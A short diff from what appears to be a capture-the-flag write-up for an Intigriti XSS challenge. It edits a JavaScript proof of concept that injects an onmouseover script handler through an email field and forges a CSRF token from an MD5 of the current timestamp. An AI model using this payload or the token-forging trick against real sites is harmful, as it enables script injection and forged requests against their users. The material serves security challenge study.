@@ -51,7 +51,7 @@ Final POC:
         function sendPayload() {
           var url = "https://challenge-0321.intigriti.io/";
           var flag = "\ onmouseover=alert('flag{THIS_IS_THE_FLAG}');//"
-          var xss_payload = "\\\"traffik\prova\\\" + flag + "@outlook.it "
+          var xss_payload = "\\\traffik\prova\\\" + flag + "@outlook.it "
 
           var d = Date.now().toString().substr(0,10);
           var csrf = CryptoJS.MD5(d).toString();
